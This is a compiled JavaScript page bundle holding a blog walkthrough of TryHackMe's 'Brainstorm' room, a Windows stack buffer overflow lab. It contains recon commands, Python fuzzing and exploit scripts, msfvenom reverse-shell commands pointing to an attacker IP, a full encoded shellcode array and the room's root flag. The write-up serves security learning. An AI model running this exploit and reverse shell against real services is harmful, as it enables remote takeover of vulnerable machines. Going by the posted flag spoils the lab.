"use strict";(self.webpackChunkronamosa_github_io=self.webpackChunkronamosa_github_io||[]).push([[7774],{28453:(e,n,s)=>{s.d(n,{R:()=>a,x:()=>x});var r=s(96540);const t={},o=r.createContext(t);function a(e){const n=r.useContext(o);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function x(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:a(e.components),r.createElement(o.Provider,{value:n},e.children)}},84875:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>i,contentTitle:()=>x,default:()=>d,frontMatter:()=>a,metadata:()=>r,toc:()=>l});const r=JSON.parse('{"id":"hacker/tryhackme/brainstorm","title":"TryHackMe Brainstorm Walkthrough - Windows Buffer Overflow Challenge","description":"Complete walkthrough of TryHackMe\'s Brainstorm room. Learn Windows buffer overflow exploitation, shellcode development, and exploit creation techniques.","source":"@site/docs/hacker/tryhackme/brainstorm.md","sourceDirName":"hacker/tryhackme","slug":"/hacker/tryhackme/brainstorm","permalink":"/docs/hacker/tryhackme/brainstorm","draft":false,"unlisted":false,"editUrl":"https://github.com/ronamosa/ronamosa.github.io/edit/main/website/docs/hacker/tryhackme/brainstorm.md","tags":[{"inline":true,"label":"tryhackme","permalink":"/docs/tags/tryhackme"},{"inline":true,"label":"buffer-overflow","permalink":"/docs/tags/buffer-overflow"},{"inline":true,"label":"windows","permalink":"/docs/tags/windows"},{"inline":true,"label":"shellcode","permalink":"/docs/tags/shellcode"},{"inline":true,"label":"exploitation","permalink":"/docs/tags/exploitation"}],"version":"current","lastUpdatedBy":"Ron Amosa","lastUpdatedAt":1758526302000,"sidebarPosition":6,"frontMatter":{"title":"TryHackMe Brainstorm Walkthrough - Windows Buffer Overflow Challenge","description":"Complete walkthrough of TryHackMe\'s Brainstorm room. Learn Windows buffer overflow exploitation, shellcode development, and exploit creation techniques.","keywords":["tryhackme brainstorm","windows buffer overflow","shellcode","exploit development","windows exploitation","immunity debugger"],"tags":["tryhackme","buffer-overflow","windows","shellcode","exploitation"],"sidebar_position":6},"sidebar":"docsSidebar","previous":{"title":"TryHackMe Gatekeeper Walkthrough - Windows Buffer Overflow and Exploitation","permalink":"/docs/hacker/tryhackme/gatekeeper"},"next":{"title":"TryHackMe Corp Walkthrough - Corporate Network Penetration Testing","permalink":"/docs/hacker/tryhackme/corp"}}');var t=s(74848),o=s(28453);const a={title:"TryHackMe Brainstorm Walkthrough - Windows Buffer Overflow Challenge",description:"Complete walkthrough of TryHackMe's Brainstorm room. Learn Windows buffer overflow exploitation, shellcode development, and exploit creation techniques.",keywords:["tryhackme brainstorm","windows buffer overflow","shellcode","exploit development","windows exploitation","immunity debugger"],tags:["tryhackme","buffer-overflow","windows","shellcode","exploitation"],sidebar_position:6},x=void 0,i={},l=[{value:"RECON",id:"recon",level:2},{value:"NMAP",id:"nmap",level:3},{value:"Buffer Overflow: Local Dev",id:"buffer-overflow-local-dev",level:2},{value:"Fuzzing",id:"fuzzing",level:3},{value:"Find EIP",id:"find-eip",level:3},{value:"Bad Chars",id:"bad-chars",level:3},{value:"payload structure",id:"payload-structure",level:3},{value:"jmp point address",id:"jmp-point-address",level:3},{value:"shellcode",id:"shellcode",level:3},{value:"Buffer Overflow: Live Target",id:"buffer-overflow-live-target",level:2}];function c(e){const n={a:"a",admonition:"admonition",code:"code",h2:"h2",h3:"h3",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",...(0,o.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsxs)(n.admonition,{title:"Description",type:"info",children:[(0,t.jsxs)(n.p,{children:["These are my notes for the ",(0,t.jsx)(n.a,{href:"https://tryhackme.com/room/brainstorm",children:"Brainstorm Room"})," on TryHackMe."]}),(0,t.jsxs)(n.table,{children:[(0,t.jsx)(n.thead,{children:(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.th,{style:{textAlign:"center"},children:"OS"}),(0,t.jsx)(n.th,{style:{textAlign:"center"},children:"Level"}),(0,t.jsx)(n.th,{style:{textAlign:"center"},children:"Rating"})]})}),(0,t.jsx)(n.tbody,{children:(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"Windows"}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"Medium"}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"4/5"})]})})]})]}),"\n",(0,t.jsx)(n.h2,{id:"recon",children:"RECON"}),"\n",(0,t.jsx)(n.h3,{id:"nmap",children:"NMAP"}),"\n",(0,t.jsxs)(n.p,{children:["ALL ports + ",(0,t.jsx)(n.code,{children:"-Pn"})," cos ICMP is blocking : ",(0,t.jsx)(n.code,{children:"nmap -v -sV 10.10.40.219 -Pn -p- -o nmap-brainstorm.txt"})]}),"\n",(0,t.jsx)(n.p,{children:"I target 3389 port RDP for vulns using nmap:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sh",children:'\u2514\u2500$ nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 10.10.40.219 -Pn\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-01-22 20:01 NZDT\nNmap scan report for 10.10.40.219\nHost is up (0.28s latency).\n\nPORT     STATE SERVICE\n3389/tcp open  ms-wbt-server\n| rdp-enum-encryption:\n|   Security layer\n|     CredSSP (NLA): SUCCESS\n|     CredSSP with Early User Auth: SUCCESS\n|     Native RDP: SUCCESS\n|     RDSTLS: SUCCESS\n|     SSL: SUCCESS\n|   RDP Encryption level: Client Compatible\n|     40-bit RC4: SUCCESS\n|     56-bit RC4: SUCCESS\n|     128-bit RC4: SUCCESS\n|     FIPS 140-1: SUCCESS\n|_  RDP Protocol Version:  RDP 5.x, 6.x, 7.x, or 8.x server\n| rdp-ntlm-info:\n|   Target_Name: BRAINSTORM\n|   NetBIOS_Domain_Name: BRAINSTORM\n|   NetBIOS_Computer_Name: BRAINSTORM\n|   DNS_Domain_Name: brainstorm\n|   DNS_Computer_Name: brainstorm\n|   Product_Version: 6.1.7601\n|_  System_Time: 2022-01-22T07:01:52+00:00\n'})}),"\n",(0,t.jsx)(n.p,{children:"Nothing."}),"\n",(0,t.jsx)(n.p,{children:"Nmap results show:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"Not shown: 65532 filtered tcp ports (no-response)\nPORT     STATE SERVICE            VERSION\n21/tcp   open  ftp                Microsoft ftpd\n3389/tcp open  ssl/ms-wbt-server?\n9999/tcp open  abyss?\n"})}),"\n",(0,t.jsxs)(n.p,{children:["I check to see what is on port ",(0,t.jsx)(n.code,{children:"9999"})," with ",(0,t.jsx)(n.code,{children:"nc $TARGET_IP 9999"}),"."]}),"\n",(0,t.jsx)(n.p,{children:"I see it's some kind of chat service."}),"\n",(0,t.jsxs)(n.p,{children:["I find an anonymous FTP access, I login browse around and find ",(0,t.jsx)(n.code,{children:"chatserver.exe"})," and ",(0,t.jsx)(n.code,{children:"essfunc.ddl"})," files."]}),"\n",(0,t.jsx)(n.h2,{id:"buffer-overflow-local-dev",children:"Buffer Overflow: Local Dev"}),"\n",(0,t.jsx)(n.p,{children:'I now have a copy of this "chat service" that I assume is the same one on the target machine, so I need to setup a local buffer overflow developing "lab".'}),"\n",(0,t.jsxs)(n.p,{children:["I setup a Win7 VM to run the ",(0,t.jsx)(n.code,{children:"chatserver.exe"})," program on."]}),"\n",(0,t.jsx)(n.p,{children:"I installed immunity debugger on the Win7 VM to develop my local buffer overflow exploit, which I will use on the THM box once complete."}),"\n",(0,t.jsx)(n.h3,{id:"fuzzing",children:"Fuzzing"}),"\n",(0,t.jsxs)(n.p,{children:["Start up immunity debugger (ImmD) on the Win7 VM, run the ",(0,t.jsx)(n.code,{children:"chatserver.exe"})," from ImmD."]}),"\n",(0,t.jsx)(n.p,{children:"I borrowed the BufferOverflowPrep rooms python scripts to use on the BRAINSTORM room starting with the fuzzer on port 9999"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'#!/usr/bin/env python3\n\nimport socket, time, sys\n\nip = "10.10.28.156"\n\nport = 9999\ntimeout = 5\n\nstring = "A" * 100\n\nwhile True:\n  try:\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n      s.settimeout(timeout)\n      s.connect((ip, port))\n      s.recv(1024)\n      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))\n      s.send(bytes(string, "latin-1"))\n      s.recv(1024)\n  except:\n    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))\n    sys.exit(0)\n  string += 100 * "A"\n  time.sleep(1)\n'})}),"\n",(0,t.jsx)(n.p,{children:"Fuzzing crashed at 6300 bytes."}),"\n",(0,t.jsx)(n.h3,{id:"find-eip",children:"Find EIP"}),"\n",(0,t.jsxs)(n.p,{children:["pattern create: ",(0,t.jsx)(n.code,{children:"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 6700"})]}),"\n",(0,t.jsxs)(n.p,{children:["EIP value on crash = ",(0,t.jsx)(n.code,{children:"48367648"})]}),"\n",(0,t.jsxs)(n.p,{children:["pattern offset: ",(0,t.jsx)(n.code,{children:"/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 6700 -q 48367648"})]}),"\n",(0,t.jsx)(n.p,{children:"Exact match at offset 6108"}),"\n",(0,t.jsx)(n.p,{children:"eip.py looks like this:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'#!/usr/bin/env python3\n\nimport socket\n\nip = "172.16.2.125"\nport = 9999\n\noffset = 6108\noverflow = "A" * offset\nretn = "BBBB"\n\nbuffer = overflow + retn\nprint("buffer=",len(buffer))\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print("Crash Overwrite EIP: 42424242...")\n  s.send(bytes(buffer + "\\r\\n", "latin-1"))\n  print("Done!")\nexcept:\n  print("Could not connect.")\n'})}),"\n",(0,t.jsxs)(n.p,{children:["running ",(0,t.jsx)(n.code,{children:"./eip.py"})," we get the correct output of EIP overwritten with our 4 x B's (42424242)."]}),"\n",(0,t.jsx)(n.h3,{id:"bad-chars",children:"Bad Chars"}),"\n",(0,t.jsxs)(n.p,{children:["Set mona work dir: ",(0,t.jsx)(n.code,{children:"!mona config -set workingfolder C:\\Users\\IEUser\\Downloads\\%p"})]}),"\n",(0,t.jsx)(n.p,{children:"let's use mona to create our byte array and test for bad chars."}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.code,{children:"!mona compare -f C:\\Users\\IEUser\\Downloads\\chatserver\\bytearray.bin -a 0187EEC0"})}),"\n",(0,t.jsxs)(n.p,{children:["I did ",(0,t.jsx)(n.code,{children:"-b \\x00\\x01"})," and got unmodified status, but ",(0,t.jsx)(n.code,{children:"\\x01"})," was a legit byte, just corrupted by nullbyte."]}),"\n",(0,t.jsx)(n.p,{children:"ran again with just nullbyte arraay, compared:"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.code,{children:"!mona compare -f C:\\Users\\IEUser\\Downloads\\chatserver\\bytearray.bin -a 0171EEC0"})}),"\n",(0,t.jsx)(n.p,{children:"got unmodified status."}),"\n",(0,t.jsx)(n.h3,{id:"payload-structure",children:"payload structure"}),"\n",(0,t.jsxs)(n.p,{children:["Your payload must be in this order: ",(0,t.jsx)(n.code,{children:"offset + retn + payload"})," \u2190 the EIP still needs to be overwritten predictively."]}),"\n",(0,t.jsx)(n.h3,{id:"jmp-point-address",children:"jmp point address"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.code,{children:'!mona jmp -r esp -cpb "\\x00"'})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sh",children:"625014DF     0x625014df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\IEUser\\Downloads\\essfunc.dll)\n625014EB     0x625014eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\IEUser\\Downloads\\essfunc.dll)\n625014F7     0x625014f7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\IEUser\\Downloads\\essfunc.dll)\n62501503     0x62501503 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\IEUser\\Downloads\\essfunc.dll)\n6250150F     0x6250150f : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\IEUser\\Downloads\\essfunc.dll)\n6250151B     0x6250151b : jmp esp | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\IEUser\\Downloads\\essfunc.dll)\n62501527     0x62501527 : jmp esp | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\IEUser\\Downloads\\essfunc.dll)\n62501533     0x62501533 : jmp esp | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\IEUser\\Downloads\\essfunc.dll)\n62501535     0x62501535 : jmp esp | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\IEUser\\Downloads\\essfunc.dll)\n0BADF00D       Found a total of 9 pointers\n"})}),"\n",(0,t.jsxs)(n.p,{children:["I pick ",(0,t.jsx)(n.code,{children:"0x62 50 14 f7"})," = ",(0,t.jsx)(n.code,{children:"\\xf7\\x14\\x50\\x62"})]}),"\n",(0,t.jsx)(n.p,{children:"our payload script looks like this:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'#!/usr/bin/env python3\n\nimport socket\n\nip = "172.16.2.125"\nport = 9999\n\noffset = 6108\noverflow = "A" * offset\nretn = "\\xf7\\x14\\x50\\x62" # found using mona\npadding = "\\x90" * 16\npayload = (\n\n)\npostfix = ""\n\nbuffer = overflow + retn + padding + payload + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print("Sending evil buffer...")\n  s.send(bytes(buffer + "\\r\\n", "latin-1"))\n  print("Done!")\nexcept:\n  print("Could not connect.")\n\n'})}),"\n",(0,t.jsx)(n.h3,{id:"shellcode",children:"shellcode"}),"\n",(0,t.jsxs)(n.p,{children:["create some shell code: ",(0,t.jsx)(n.code,{children:'msfvenom -p windows/shell_reverse_tcp LHOST=172.16.2.106 LPORT=4444 EXITFUNC=thread -b "\\x00" -f c'})]}),"\n",(0,t.jsx)(n.h2,{id:"buffer-overflow-live-target",children:"Buffer Overflow: Live Target"}),"\n",(0,t.jsx)(n.p,{children:"NOTE: dev machine ip in shellcode needs to change to my tun0 (VPN) interface IP, and the ip address of the destination server in the python script needs to point to THM box."}),"\n",(0,t.jsx)(n.p,{children:'After trying the exact same shellcode but changing for the THM LHOST, I failed to get a shell.... suggestion from a stream follower said "try on a legit or lower port, not 4444".'}),"\n",(0,t.jsx)(n.p,{children:"I re-created my reverse shellcode, with port 80"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sh",children:'msfvenom -p windows/shell_reverse_tcp LHOST=10.11.55.83 LPORT=80 EXITFUNC=thread -b "\\x00" -f c\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nFound 11 compatible encoders\nAttempting to encode payload with 1 iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 351 (iteration=0)\nx86/shikata_ga_nai chosen with final size 351\nPayload size: 351 bytes\nFinal size of c file: 1500 bytes\nunsigned char buf[] =\n"\\xdb\\xda\\xb8\\x4c\\xf0\\x7a\\x5c\\xd9\\x74\\x24\\xf4\\x5b\\x31\\xc9\\xb1"\n"\\x52\\x31\\x43\\x17\\x03\\x43\\x17\\x83\\x8f\\xf4\\x98\\xa9\\xf3\\x1d\\xde"\n"\\x52\\x0b\\xde\\xbf\\xdb\\xee\\xef\\xff\\xb8\\x7b\\x5f\\x30\\xca\\x29\\x6c"\n"\\xbb\\x9e\\xd9\\xe7\\xc9\\x36\\xee\\x40\\x67\\x61\\xc1\\x51\\xd4\\x51\\x40"\n"\\xd2\\x27\\x86\\xa2\\xeb\\xe7\\xdb\\xa3\\x2c\\x15\\x11\\xf1\\xe5\\x51\\x84"\n"\\xe5\\x82\\x2c\\x15\\x8e\\xd9\\xa1\\x1d\\x73\\xa9\\xc0\\x0c\\x22\\xa1\\x9a"\n"\\x8e\\xc5\\x66\\x97\\x86\\xdd\\x6b\\x92\\x51\\x56\\x5f\\x68\\x60\\xbe\\x91"\n"\\x91\\xcf\\xff\\x1d\\x60\\x11\\x38\\x99\\x9b\\x64\\x30\\xd9\\x26\\x7f\\x87"\n"\\xa3\\xfc\\x0a\\x13\\x03\\x76\\xac\\xff\\xb5\\x5b\\x2b\\x74\\xb9\\x10\\x3f"\n"\\xd2\\xde\\xa7\\xec\\x69\\xda\\x2c\\x13\\xbd\\x6a\\x76\\x30\\x19\\x36\\x2c"\n"\\x59\\x38\\x92\\x83\\x66\\x5a\\x7d\\x7b\\xc3\\x11\\x90\\x68\\x7e\\x78\\xfd"\n"\\x5d\\xb3\\x82\\xfd\\xc9\\xc4\\xf1\\xcf\\x56\\x7f\\x9d\\x63\\x1e\\x59\\x5a"\n"\\x83\\x35\\x1d\\xf4\\x7a\\xb6\\x5e\\xdd\\xb8\\xe2\\x0e\\x75\\x68\\x8b\\xc4"\n"\\x85\\x95\\x5e\\x4a\\xd5\\x39\\x31\\x2b\\x85\\xf9\\xe1\\xc3\\xcf\\xf5\\xde"\n"\\xf4\\xf0\\xdf\\x76\\x9e\\x0b\\x88\\x72\\x54\\x24\\x1b\\xeb\\x68\\x4a\\x9b"\n"\\xbb\\xe5\\xac\\xf1\\x2b\\xa0\\x67\\x6e\\xd5\\xe9\\xf3\\x0f\\x1a\\x24\\x7e"\n"\\x0f\\x90\\xcb\\x7f\\xde\\x51\\xa1\\x93\\xb7\\x91\\xfc\\xc9\\x1e\\xad\\x2a"\n"\\x65\\xfc\\x3c\\xb1\\x75\\x8b\\x5c\\x6e\\x22\\xdc\\x93\\x67\\xa6\\xf0\\x8a"\n"\\xd1\\xd4\\x08\\x4a\\x19\\x5c\\xd7\\xaf\\xa4\\x5d\\x9a\\x94\\x82\\x4d\\x62"\n"\\x14\\x8f\\x39\\x3a\\x43\\x59\\x97\\xfc\\x3d\\x2b\\x41\\x57\\x91\\xe5\\x05"\n"\\x2e\\xd9\\x35\\x53\\x2f\\x34\\xc0\\xbb\\x9e\\xe1\\x95\\xc4\\x2f\\x66\\x12"\n"\\xbd\\x4d\\x16\\xdd\\x14\\xd6\\x36\\x3c\\xbc\\x23\\xdf\\x99\\x55\\x8e\\x82"\n"\\x19\\x80\\xcd\\xba\\x99\\x20\\xae\\x38\\x81\\x41\\xab\\x05\\x05\\xba\\xc1"\n"\\x16\\xe0\\xbc\\x76\\x16\\x21";\n'})}),"\n",(0,t.jsx)(n.p,{children:"Ran it again, and got a shell:"}),"\n",(0,t.jsxs)(n.p,{children:["root.txt = ",(0,t.jsx)(n.code,{children:"5b1001de5a44eca47eee71e7942a8f8a"})," under ",(0,t.jsx)(n.code,{children:"C:\\Users\\drake\\Desktop\\root.txt"})]})]})}function d(e={}){const{wrapper:n}={...(0,o.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(c,{...e})}):c(e)}}}]);